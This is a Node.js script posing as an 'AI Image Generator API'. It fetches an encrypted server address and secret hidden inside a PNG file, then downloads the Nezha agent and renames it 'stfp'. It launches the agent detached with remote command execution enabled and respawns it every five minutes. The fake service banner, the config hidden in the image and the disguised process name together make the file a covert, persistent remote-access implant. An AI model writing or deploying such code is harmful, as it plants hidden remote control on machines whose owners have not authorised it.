const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { readdirSync, readFileSync, writeFileSync, existsSync, mkdirSync, rmSync, chmodSync, unlinkSync } = require('fs');
const { spawn, execSync } = require('child_process');
const path = require('path');

// ========== 本地硬盘路径配置（Docker持久化挂载目录）==========
const BASEDIR = path.join(process.cwd(), '.npm_logs');
const CACHE_DIR = path.join(process.cwd(), 'agent_cache');
const AGENT_BIN = path.join(CACHE_DIR, 'stfp');
const CONFIG_PATH = path.join(CACHE_DIR, 'config.yml');
const LOCAL_IMAGE_PATH = path.join(CACHE_DIR, 'dknz.png');
const ZIP_PATH = path.join(CACHE_DIR, 'agent.zip');

const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;

ensureDir(BASEDIR);
ensureDir(CACHE_DIR);

const processList = ["stfp"];

// 加密密钥
const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";

function fetchText(url) {
    return new Promise((resolve, reject) => {
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data));
                } else {
                    reject(new Error(`Fetch text failed, status: ${res.statusCode}`));
                }
            }).on('error', () => reject(new Error(`Network error`)));
        };
        request(url);
    });
}

function fetchFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    res.pipe(file);
                    file.on('finish', () => {
                        file.close(() => resolve(true));
                    });
                } else {
                    if (existsSync(destPath)) unlinkSync(destPath);
                    reject(new Error(`Download failed, status: ${res.statusCode}`));
                }
            }).on('error', (err) => {
                if (existsSync(destPath)) unlinkSync(destPath);
                reject(err);
            });
        };
        request(url);
    });
}

async function getServerIP() {
    try {
        return await fetchText('https://api.ipify.org');
    } catch (e) {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
        return '127.0.0.1';
    }
}

function generateUUID(ip) {
    const hash = crypto.createHash('md5').update(ip).digest('hex');
    return `${hash.substring(0,8)}-${hash.substring(8,12)}-${hash.substring(12,16)}-${hash.substring(16,20)}-${hash.substring(20,32)}`;
}

function parseImageMetadata(imagePath) {
    try {
        const buffer = fs.readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');
        
        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) return null;
        
        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) return null;
        
        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf-8').trim();
        
        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch(e) {
        return null;
    }
}

function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

async function startNezhaAgent() {
    try {
        console.log("Initializing image generation engine...");
        
        const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
        await fetchFile(imageUrl, LOCAL_IMAGE_PATH);
        const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
        if (!decryptedText) return false;
        
        const nezhaConfig = parseEnv(decryptedText);
        const ip = await getServerIP();
        const uuid = generateUUID(ip);

        if (!existsSync(AGENT_BIN)) {
            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
            const arch = archMap[process.arch] || 'amd64';
            const downloadUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
            
            await fetchFile(downloadUrl, ZIP_PATH);
            
            if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
            ensureDir(CACHE_DIR);

            try {
                execSync(`unzip -o "${ZIP_PATH}" -d "${CACHE_DIR}"`, { stdio: 'ignore' });
            } catch (e) {
                try {
                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('${ZIP_PATH}').extractall('${CACHE_DIR}')"`, { stdio: 'ignore' });
                } catch (e2) {
                    try {
                        execSync(`python -c "import zipfile; zipfile.ZipFile('${ZIP_PATH}').extractall('${CACHE_DIR}')"`, { stdio: 'ignore' });
                    } catch (e3) {
                        console.error("解压失败");
                        return false;
                    }
                }
            }
            const originBin = path.join(CACHE_DIR, 'nezha-agent');
            if (existsSync(originBin)) {
                fs.renameSync(originBin, AGENT_BIN);
            }
            if (os.platform() !== 'win32') {
                chmodSync(AGENT_BIN, 0o755);
            }
        }

        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${uuid}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${uuid}'
`;
        writeFileSync(CONFIG_PATH, configContent);

        spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
            env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
            stdio: "ignore",
            detached: true
        });

        console.log("stfp 哪吒进程启动成功");
        return true;
    } catch (err) {
        console.error("启动失败", err);
        return false;
    }
}

function listRunningCommands() {
    const procList = [];
    try {
        if (os.platform() === 'win32') {
            const output = execSync('tasklist /nh', { encoding: 'utf8' });
            return output.split('\n').filter(line => line.trim()).map(line => ({ cmdline: line }));
        } else {
            const output = execSync('ps -ef', { encoding: 'utf8' });
            return output.split('\n').filter(line => line.trim()).map(line => ({ cmdline: line }));
        }
    } catch (e) {
        return [];
    }
}

async function monitorProcesses() {
    const running = listRunningCommands();
    const missing = processList.every(keyword =>
        !running.some(proc => proc.cmdline.includes(keyword))
    );
    if (missing) {
        await startNezhaAgent();
    }
}

const Scheduler = {
    intervalMinutes: 5,
    active: true,
    async loop() {
        if (!this.active) return;
        await monitorProcesses();
        setTimeout(() => this.loop(), this.intervalMinutes * 60 * 1000);
    }
};

// HTTP服务，新增 /start-nz 接口，访问域名+/start-nz 一键启动哪吒
http.createServer(async (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    // 一键启动哪吒接口
    if (req.url === '/start-nz') {
        const ret = await startNezhaAgent();
        res.writeHead(200);
        return res.end(JSON.stringify({
            code: ret ? 0 : -1,
            msg: ret ? "哪吒stfp进程已成功启动" : "启动失败，请查看日志"
        }));
    }
    // 状态接口
    if (req.url === '/api/v1/status') {
        const running = listRunningCommands();
        const isRunning = running.some(proc => proc.cmdline.includes("stfp"));
        res.writeHead(200);
        return res.end(JSON.stringify({
            status: "online",
            service: "AI Image Generator API",
            version: "2.4.1",
            nezha_running: isRunning,
            endpoints: ["/api/v1/render", "/api/v1/status", "/start-nz"]
        }));
    }
    // 默认首页
    res.writeHead(200);
    res.end(JSON.stringify({
        status: "online",
        service: "AI Image Generator API",
        version: "2.4.1",
        tips: "访问 /start-nz 手动启动哪吒进程"
    }));
}).listen(PORT, () => {
    console.log(`服务监听端口: ${PORT}`);
    setTimeout(() => Scheduler.loop(), 2000);
});

function ensureDir(p) {
    if (!existsSync(p)) mkdirSync(p, { recursive: true });
}
